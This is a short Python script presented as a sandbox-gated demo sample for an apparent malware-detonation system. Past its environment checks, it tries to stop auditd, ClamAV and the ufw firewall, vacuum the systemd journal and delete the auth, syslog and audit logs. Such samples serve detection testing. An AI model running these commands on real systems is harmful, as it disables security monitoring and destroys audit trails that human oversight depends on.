# Demo sample for Detonation Ocean. Refuses to run outside the sandbox.
import os
import subprocess
import sys

# Two conditions, both required: the sandbox marker, and a home directory that is the seeded one. Anything else exits here.
if os.environ.get("DETONATION_SANDBOX") != "1" or os.path.expanduser("~") != "/home/dana" or not os.path.isdir("/home/dana/Documents"):
    sys.exit(0)

# Switch off the sensors that would record the run, then delete what they already wrote. Every command fails in the image
# (none of these services is installed) and the log paths sit on the read-only root, so the whole sample is an attempt.
for command in (
    ["systemctl", "stop", "auditd"],
    ["systemctl", "stop", "clamav-daemon"],
    ["pkill", "-f", "clamd"],
    ["ufw", "disable"],
    ["journalctl", "--rotate"],
    ["journalctl", "--vacuum-time=1s"],
):
    try:
        subprocess.run(command, capture_output=True, timeout=3)
    except (OSError, subprocess.SubprocessError):
        pass

for path in ("/var/log/auth.log", "/var/log/syslog", "/var/log/audit/audit.log"):
    try:
        os.remove(path)
    except OSError:
        pass
